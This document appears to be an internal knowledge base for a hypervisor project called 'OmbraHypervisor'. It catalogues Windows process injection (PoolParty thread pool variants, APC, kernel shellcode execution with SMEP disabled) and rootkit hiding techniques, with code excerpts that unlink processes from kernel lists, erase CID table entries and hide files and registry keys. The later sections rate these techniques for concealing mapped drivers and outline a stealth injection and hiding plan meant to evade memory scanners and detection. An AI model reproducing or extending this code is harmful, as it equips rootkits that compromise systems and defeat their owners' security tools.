# A13: Process Injection and Hiding Techniques Knowledge Base

## Overview

This document catalogs process injection techniques, memory manipulation patterns, and hiding mechanisms relevant to OmbraHypervisor. The analysis draws from three reference repositories: PoolParty (thread pool injection), hidden (driver-based hiding), and Kernel-Bridge (kernel-mode primitives).

---

## 1. Injection Technique Catalog

### 1.1 PoolParty: Windows Thread Pool Injection

**Source:** `/Users/jonathanmcclintock/Desktop/OmbraHypervisor/Refs/PoolParty/`

PoolParty represents a class of injection techniques that abuse Windows Thread Pool internals. These techniques were presented at Black Hat EU 2023 and are notable for their ability to evade common detection mechanisms.

#### Core Mechanism

The Windows Thread Pool provides worker factories that manage thread execution. Each process with a thread pool has:
- A `TpWorkerFactory` object with a start routine
- An `IoCompletion` port for asynchronous work items
- Timer queues for scheduled execution

#### Variant 1: Worker Factory Start Routine Overwrite

```cpp
// From PoolParty/PoolParty.cpp
void WorkerFactoryStartRoutineOverwrite::SetupExecution() const
{
    ULONG WorkerFactoryMinimumThreadNumber = m_WorkerFactoryInformation.TotalWorkerCount + 1;
    w_NtSetInformationWorkerFactory(*m_p_hWorkerFactory, WorkerFactoryThreadMinimum,
                                     &WorkerFactoryMinimumThreadNumber, sizeof(ULONG));
}
```

**How it works:**
1. Hijack the worker factory handle from target process
2. Write shellcode to the worker factory's start routine address
3. Increase the minimum thread count to trigger new thread creation
4. New worker thread executes the shellcode as its start routine

**Detection methods:**
- Monitor NtSetInformationWorkerFactory calls with WorkerFactoryThreadMinimum
- Watch for worker factory handle duplication across processes
- Verify start routine addresses against known modules

#### Variant 2-8: Work Item Insertion Techniques

These variants insert crafted work items into the target's thread pool queues:

| Variant | Structure | Trigger Mechanism |
|---------|-----------|-------------------|
| TP_WORK | Task queue insertion | Pool dequeues on next work cycle |
| TP_WAIT | Wait completion packet | Event signal triggers callback |
| TP_IO | IO completion | File write triggers callback |
| TP_ALPC | ALPC completion | ALPC message triggers callback |
| TP_JOB | Job notification | Job object event triggers callback |
| TP_DIRECT | Direct callback | IO completion queue insertion |
| TP_TIMER | Timer queue | Timer expiration triggers callback |

**TP_TIMER Insertion Example:**

```cpp
// From PoolParty/PoolParty.cpp - RemoteTpTimerInsertion
void RemoteTpTimerInsertion::SetupExecution() const
{
    // Allocate TP_TIMER in target
    const auto RemoteTpTimerAddress = static_cast<PFULL_TP_TIMER>(
        w_VirtualAllocEx(*m_p_hTargetPid, sizeof(FULL_TP_TIMER),
                         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

    // Configure timer with shellcode callback
    pTpTimer->Work.CleanupGroupMember.Pool = static_cast<PFULL_TP_POOL>(
        WorkerFactoryInformation.StartParameter);
    pTpTimer->DueTime = Timeout;

    // Insert into target's timer queue
    w_WriteProcessMemory(*m_p_hTargetPid,
        &pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root,
        reinterpret_cast<PVOID>(&TpTimerWindowStartLinks),
        sizeof(TpTimerWindowStartLinks));

    // Trigger timer expiration
    w_NtSetTimer2(*m_p_hTimer, &ulDueTime, 0, &Parameters);
}
```

#### Handle Hijacking Infrastructure

```cpp
// From PoolParty/HandleHijacker.cpp
std::shared_ptr<HANDLE> HijackProcessHandle(std::wstring wsObjectType,
    std::shared_ptr<HANDLE> p_hTarget, DWORD dwDesiredAccess)
{
    // Query process handle information
    auto pProcessInformation = w_QueryInformation<...>(
        NtQueryInformationProcess, *p_hTarget, ProcessHandleInformation);

    // Enumerate all handles looking for target type
    for (auto i = 0; i < pProcessHandleInformation->NumberOfHandles; i++)
    {
        p_hDuplicatedObject = w_DuplicateHandle(
            *p_hTarget, pProcessHandleInformation->Handles[i].HandleValue,
            GetCurrentProcess(), dwDesiredAccess, FALSE, NULL);

        // Check object type matches (TpWorkerFactory, IoCompletion, IRTimer)
        if (wsObjectType == std::wstring(pObjectTypeInformation->TypeName.Buffer))
            return p_hDuplicatedObject;
    }
}
```

#### Hypervisor-Assisted Possibilities

For OmbraHypervisor, thread pool injection could be enhanced:
- Use EPT to hide injected work items from memory scanners
- Intercept NtQueryInformationWorkerFactory to hide modifications
- Shadow timer queue structures to prevent detection

---

### 1.2 Classic Injection Techniques (Reference)

#### DLL Injection via CreateRemoteThread

Traditional method - well documented and easily detected.

#### APC Injection

Queue user-mode APC to target thread. Kernel-Bridge provides:

```cpp
// From Kernel-Bridge/User-Bridge/API/User-Bridge.cpp
BOOL WINAPI KbQueueUserApc(ULONG ThreadId, WdkTypes::PVOID ApcProc,
                            WdkTypes::PVOID Argument)
{
    KB_QUEUE_USER_APC_IN Input = {};
    Input.ThreadId = ThreadId;
    Input.ApcProc = ApcProc;
    Input.Argument = Argument;
    return KbSendRequest(Ctls::KbQueueUserApc, &Input, sizeof(Input));
}
```

#### Shellcode Execution

Kernel-Bridge demonstrates kernel-mode shellcode execution with SMEP handling:

```cpp
// From Kernel-Bridge/Kernel-Bridge/API/KernelShells.cpp
ULONG ExecuteShellCode(_ShellCode Shell, OPTIONAL IN OUT PVOID Argument)
{
    KFLOATING_SAVE FpuState = {};
    BOOLEAN FpuSaved = KeSaveFloatingPointState(&FpuState) == STATUS_SUCCESS;

    KeSetSystemAffinityThread(1); // Execute on core 0

    if (CPU::IsSmepPresent()) CPU::DisableSmep();

    __try {
        Result = Shell(Importer::GetKernelProcAddress, Argument);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        Result = static_cast<ULONG>(-1);
    }

    if (CPU::IsSmepPresent()) CPU::EnableSmep();
    KeSetSystemAffinityThread(PreviousAffinity);

    if (FpuSaved) KeRestoreFloatingPointState(&FpuState);
    return Result;
}
```

---

## 2. Memory Manipulation Patterns

### 2.1 Process Memory Operations

**Source:** `/Users/jonathanmcclintock/Desktop/OmbraHypervisor/Refs/Kernel-Bridge/User-Bridge/API/User-Bridge.cpp`

Kernel-Bridge exposes comprehensive memory primitives:

```cpp
// Allocate user memory in target process
BOOL WINAPI KbAllocUserMemory(ULONG ProcessId, ULONG Protect, ULONG Size,
                               OUT WdkTypes::PVOID* BaseAddress);

// Read/Write process memory
BOOL WINAPI KbReadProcessMemory(ULONG ProcessId, IN WdkTypes::PVOID BaseAddress,
                                 OUT PVOID Buffer, ULONG Size);

BOOL WINAPI KbWriteProcessMemory(ULONG ProcessId, OUT WdkTypes::PVOID BaseAddress,
                                  IN PVOID Buffer, ULONG Size,
                                  BOOLEAN PerformCopyOnWrite);

// Secure memory regions from modification
BOOL WINAPI KbSecureVirtualMemory(ULONG ProcessId, WdkTypes::PVOID BaseAddress,
                                   ULONG Size, ULONG ProtectRights,
                                   OUT WdkTypes::HANDLE* SecureHandle);
```

### 2.2 Physical Memory Access

Direct physical memory manipulation bypasses virtual memory protections:

```cpp
// Map physical memory to virtual space
BOOL WINAPI KbMapPhysicalMemory(IN WdkTypes::PVOID PhysicalAddress,
                                 ULONG Size,
                                 WdkTypes::MEMORY_CACHING_TYPE CachingType,
                                 OUT WdkTypes::PVOID* VirtualAddress);

// Read/Write physical memory directly
BOOL WINAPI KbReadPhysicalMemory(WdkTypes::PVOID64 PhysicalAddress,
                                  OUT PVOID Buffer, ULONG Size,
                                  WdkTypes::MEMORY_CACHING_TYPE CachingType);

BOOL WINAPI KbWritePhysicalMemory(WdkTypes::PVOID64 PhysicalAddress,
                                   IN PVOID Buffer, ULONG Size,
                                   WdkTypes::MEMORY_CACHING_TYPE CachingType);
```

### 2.3 MDL-Based Memory Mapping

Memory Descriptor Lists enable cross-process memory sharing:

```cpp
// Map memory between processes
BOOL WINAPI KbMapMemory(OUT PMAPPING_INFO MappingInfo,
                         OPTIONAL UINT64 SrcProcessId,
                         OPTIONAL UINT64 DestProcessId,
                         WdkTypes::PVOID VirtualAddress,
                         ULONG Size,
                         WdkTypes::KPROCESSOR_MODE MapToAddressSpace,
                         ULONG Protect,
                         WdkTypes::MEMORY_CACHING_TYPE CacheType,
                         OPTIONAL WdkTypes::PVOID UserRequestedAddress);
```

---

## 3. Process Hiding Techniques

### 3.1 ActiveProcessLinks Unlinking

**Source:** `/Users/jonathanmcclintock/Desktop/OmbraHypervisor/Refs/hidden/Hidden/PsMonitor.c`

The hidden driver demonstrates EPROCESS list manipulation:

```c
VOID UnlinkProcessFromList(PLIST_ENTRY Current)
{
    PLIST_ENTRY Previous, Next;

    Previous = (Current->Blink);
    Next = (Current->Flink);

    // Connect previous to next, bypassing current
    Previous->Flink = Next;
    Next->Blink = Previous;

    // Point current to itself to prevent BSOD on cleanup
    Current->Blink = (PLIST_ENTRY)&Current->Flink;
    Current->Flink = (PLIST_ENTRY)&Current->Flink;
}

VOID UnlinkProcessFromActiveProcessLinks(PProcessTableEntry Entry)
{
    PLIST_ENTRY CurrentList = GetActiveProcessLinksList(Entry->reference);

    KeAcquireGuardedMutex(&g_activeProcListLock);
    UnlinkProcessFromList(CurrentList);
    KeReleaseGuardedMutex(&g_activeProcListLock);
}
```

**Limitation:** Process is still accessible by PID via PspCidTable.

### 3.2 PspCidTable Manipulation

Complete process hiding requires CID table modification:

```c
// From hidden/Hidden/PsMonitor.c
BOOLEAN RemoveHandleCallbackWin8(PVOID PspCidTable,
    PHANDLE_TABLE_ENTRY HandleTableEntry, HANDLE Handle, PVOID EnumParameter)
{
    PCidTableContext context = (PCidTableContext)EnumParameter;

    if (context->ProcessId == Handle)
    {
        context->Found = TRUE;
        context->Entry = HandleTableEntry;
        context->EntryBackup = *HandleTableEntry;

        // Zero out the entry
        HandleTableEntry->u1.Object = 0;
        HandleTableEntry->u2.NextFreeTableEntry = (ULONG_PTR)HandleTableEntry;

        return TRUE; // Stop enumeration
    }
    return FALSE;
}

VOID UnlinkProcessFromCidTable(PProcessTableEntry Entry)
{
    PVOID PspCidTable = GetPspCidTablePointer();

    CidTableContext context;
    context.ProcessId = Entry->processId;
    context.Found = FALSE;

    // Use ExEnumHandleTable to find and remove the entry
    ExEnumHandleTable(PspCidTable, routine, &context, NULL);

    // Backup for restoration
    Entry->cidEntryBackup = context.EntryBackup;
    Entry->cidEntry = context.Entry;
}
```

### 3.3 Finding PspCidTable Dynamically

**Source:** `/Users/jonathanmcclintock/Desktop/OmbraHypervisor/Refs/hidden/Hidden/KernelAnalyzer.c`

```c
// Disassemble PsLookupProcessByProcessId to find PspCidTable reference
BOOLEAN LookForPspCidTableCallback(ZyanU64 address,
    ZydisDecodedInstruction* instruction, PVOID params)
{
    if (instruction->mnemonic == ZYDIS_MNEMONIC_MOV)
    {
        ZyanU64 pointer = 0;

        ZydisCalcAbsoluteAddress(instruction, instruction->operands + 1,
                                  address, &pointer);

        // Skip thread-local references (GS/FS segment)
        if (instruction->operands[1].mem.segment == ZYDIS_REGISTER_GS)
            return TRUE;

        s_NTinternals.PspCidTable = *(PVOID*)(ULONG_PTR)pointer;
        return FALSE; // Found it
    }
    return TRUE;
}

VOID LookForPspCidTable()
{
    BOOLEAN EnterCalls = TRUE;
    Disassemble((PVOID)PsLookupProcessByProcessId, 0x40,
                LookForPspCidTableCallback, &EnterCalls);
}
```

### 3.4 Finding ActiveProcessLinks Offset

```c
// From hidden/Hidden/KernelAnalyzer.c
ULONG FindActiveProcessLinksOffset(PEPROCESS Process)
{
    // Known offsets by Windows version
#ifdef _M_AMD64
    ULONG knownOffsets[] = { 0xE8/*Vista*/, 0x188/*7*/, 0x2E8/*8*/,
                             0x2F0/*TH1*/, 0x448/*20H1*/ };
#else
    ULONG knownOffsets[] = { 0xA0/*Vista*/, 0xB8/*7*/, 0xE8/*20H1*/ };
#endif

    HANDLE processId = PsGetProcessId(Process);

    // Fast check known offsets
    for (ULONG i = 0; i < _countof(knownOffsets); i++)
    {
        if (IsValidActiveProcessLinksOffset(Process, processId, knownOffsets[i]))
            return knownOffsets[i];
    }

    // Slow scan: UniqueProcessId is at offset-sizeof(HANDLE) from ActiveProcessLinks
    for (ULONG offset = 0xC0; offset < 0x500; offset += sizeof(void*))
    {
        if (IsValidActiveProcessLinksOffset(Process, processId, offset))
            return offset;
    }
    return 0;
}
```

---

## 4. File System Hiding

### 4.1 Minifilter-Based File Hiding

**Source:** `/Users/jonathanmcclintock/Desktop/OmbraHypervisor/Refs/hidden/Hidden/FsFilter.c`

The hidden driver uses a filesystem minifilter to intercept directory queries:

```c
// Pre-operation callback for file creation
FLT_PREOP_CALLBACK_STATUS FltCreatePreOperation(PFLT_CALLBACK_DATA Data, ...)
{
    if (IsProcessExcluded(PsGetCurrentProcessId()))
        return FLT_PREOP_SUCCESS_NO_CALLBACK;

    status = FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED, &fltName);

    if (CheckExcludeListDirectory(g_excludeFileContext, &fltName->Name))
    {
        Data->IoStatus.Status = STATUS_NO_SUCH_FILE;
        return FLT_PREOP_COMPLETE;
    }
    return FLT_PREOP_SUCCESS_NO_CALLBACK;
}

// Post-operation callback for directory enumeration
FLT_POSTOP_CALLBACK_STATUS FltDirCtrlPostOperation(PFLT_CALLBACK_DATA Data, ...)
{
    switch (params->DirectoryControl.QueryDirectory.FileInformationClass)
    {
    case FileFullDirectoryInformation:
        status = CleanFileFullDirectoryInformation(...);
        break;
    case FileBothDirectoryInformation:
        status = CleanFileBothDirectoryInformation(...);
        break;
    // ... other cases
    }
}
```

### 4.2 Directory Entry Removal

```c
// Remove matching entries from directory listing
NTSTATUS CleanFileFullDirectoryInformation(PFILE_FULL_DIR_INFORMATION info,
    PFLT_FILE_NAME_INFORMATION fltName)
{
    do {
        fileName.Buffer = info->FileName;
        fileName.Length = (USHORT)info->FileNameLength;

        if (CheckExcludeListDirFile(g_excludeFileContext, &fltName->Name, &fileName))
        {
            if (prevInfo != NULL)
            {
                // Skip this entry by adjusting previous NextEntryOffset
                prevInfo->NextEntryOffset += info->NextEntryOffset;
                RtlFillMemory(info, sizeof(FILE_FULL_DIR_INFORMATION), 0);
            }
            else
            {
                // First entry - move subsequent entries up
                RtlMoveMemory(info, (PUCHAR)info + info->NextEntryOffset, moveLength);
            }
        }

        offset = info->NextEntryOffset;
        prevInfo = info;
        info = (PFILE_FULL_DIR_INFORMATION)((PCHAR)info + offset);
    } while (offset != 0);
}
```

---

## 5. Registry Hiding

### 5.1 Registry Callback Filter

**Source:** `/Users/jonathanmcclintock/Desktop/OmbraHypervisor/Refs/hidden/Hidden/RegFilter.c`

```c
// Registry callback function
NTSTATUS RegistryFilterCallback(PVOID CallbackContext, PVOID Argument1, PVOID Argument2)
{
    REG_NOTIFY_CLASS notifyClass = (REG_NOTIFY_CLASS)(ULONG_PTR)Argument1;

    switch (notifyClass)
    {
    case RegNtPreCreateKey:
        status = RegPreCreateKey(CallbackContext, Argument2);
        break;
    case RegNtPreOpenKeyEx:
        status = RegPreOpenKeyEx(CallbackContext, Argument2);
        break;
    case RegNtPostEnumerateKey:
        status = RegPostEnumKey(CallbackContext, Argument2);
        break;
    // ... other cases
    }
    return status;
}

// Block access to hidden keys
NTSTATUS RegPreOpenKeyEx(PVOID context, PREG_OPEN_KEY_INFORMATION info)
{
    if (IsProcessExcluded(PsGetCurrentProcessId()))
        return STATUS_SUCCESS;

    if (CheckRegistryKeyInExcludeList(info->RootObject, info->CompleteName))
    {
        return STATUS_NOT_FOUND;
    }
    return STATUS_SUCCESS;
}
```

---

## 6. Relevance Assessment for OmbraHypervisor

### 6.1 Applicable Techniques

| Technique | Applicability | Notes |
|-----------|---------------|-------|
| Thread Pool Injection | Medium | Could use for driver mapping callback |
| Process List Unlinking | High | Essential for hiding mapped drivers |
| PspCidTable Manipulation | High | Complete process hiding |
| Filesystem Hiding | Medium | Hide driver files if persistent |
| Registry Hiding | Medium | Hide driver registry entries |
| Physical Memory RW | High | Core hypervisor capability |
| MDL Mapping | High | Cross-process memory operations |

### 6.2 Hypervisor Enhancements

OmbraHypervisor can enhance these techniques:

1. **EPT-Protected Injection**
   - Hide injected code from memory scanners
   - Present different content on read vs execute

2. **Transparent Process Hiding**
   - Intercept process enumeration at VMExit level
   - No need to modify kernel structures

3. **VM Exit-Based Registry/FS Hiding**
   - Hook syscalls via VMExit instead of callbacks
   - Harder to detect than kernel callbacks

4. **Secure Memory Regions**
   - Mark injected regions as non-present to guests
   - Only hypervisor can access

### 6.3 Detection Avoidance Considerations

**PoolParty Detection Vectors:**
- Handle duplication patterns
- Modified thread pool structures
- Unexpected IO completion packets

**Process Hiding Detection Vectors:**
- Inconsistency between enumeration methods
- CID table integrity checks
- EPROCESS list traversal mismatches

**OmbraHypervisor Advantages:**
- EPT manipulation is transparent to guest OS
- No kernel structure modifications visible
- VMExit interception is below OS detection

---

## 7. Thread Pool Structures Reference

### 7.1 Key Structures

```cpp
// From PoolParty/ThreadPool.hpp
typedef struct _FULL_TP_POOL
{
    struct _TPP_REFCOUNT Refcount;
    union _TPP_POOL_QUEUE_STATE QueueState;
    struct _TPP_QUEUE* TaskQueue[3];    // HIGH, NORMAL, LOW priority
    struct _TPP_NUMA_NODE* NumaNode;
    void* WorkerFactory;
    void* CompletionPort;
    struct _RTL_SRWLOCK Lock;
    struct _LIST_ENTRY PoolObjectList;
    struct _LIST_ENTRY WorkerList;
    struct _TPP_TIMER_QUEUE TimerQueue;
    // ...
} FULL_TP_POOL;

typedef struct _FULL_TP_WORK
{
    struct _TPP_CLEANUP_GROUP_MEMBER CleanupGroupMember;
    struct _TP_TASK Task;
    volatile union _TPP_WORK_STATE WorkState;
} FULL_TP_WORK;

typedef struct _TP_DIRECT
{
    struct _TP_TASK Task;
    UINT64 Lock;
    struct _LIST_ENTRY IoCompletionInformationList;
    void* Callback;         // Shellcode address goes here
    UINT32 NumaNode;
    UINT8 IdealProcessor;
} TP_DIRECT;
```

### 7.2 Worker Factory Information

```cpp
typedef struct _WORKER_FACTORY_BASIC_INFORMATION
{
    LARGE_INTEGER Timeout;
    LARGE_INTEGER RetryDelay;
    LARGE_INTEGER IdleTimeout;
    BOOLEAN Paused;
    BOOLEAN TurboEnabled;
    void* StartRoutine;     // Overwrite target for Variant 1
    void* StartParameter;   // Points to TP_POOL
    ULONG TotalWorkerCount;
    // ...
} WORKER_FACTORY_BASIC_INFORMATION;
```

---

## 8. Implementation Notes

### 8.1 For Driver Mapping

The injection flow for OmbraHypervisor driver mapping should:

1. Allocate memory in target process (via hypercall)
2. Copy driver image to target
3. Use EPT to protect from detection
4. Trigger execution via:
   - Thread pool work item (stealthy)
   - APC injection (reliable)
   - New thread creation (simplest)

### 8.2 For Module Hiding

After mapping, hide via:

1. VAD unlinking (prevents VirtualQuery detection)
2. PEB.Ldr unlinking (prevents module enumeration)
3. EPT shadowing (prevents memory scans)

### 8.3 Synchronization Requirements

Both hidden and PoolParty demonstrate the need for proper synchronization:

- Use guarded mutexes for list operations
- Backup entries before modification for cleanup
- Handle process termination gracefully

---

## References

- PoolParty: `/Users/jonathanmcclintock/Desktop/OmbraHypervisor/Refs/PoolParty/`
- hidden: `/Users/jonathanmcclintock/Desktop/OmbraHypervisor/Refs/hidden/`
- Kernel-Bridge: `/Users/jonathanmcclintock/Desktop/OmbraHypervisor/Refs/Kernel-Bridge/`
- Black Hat EU 2023: "The Pool Party You Will Never Forget"
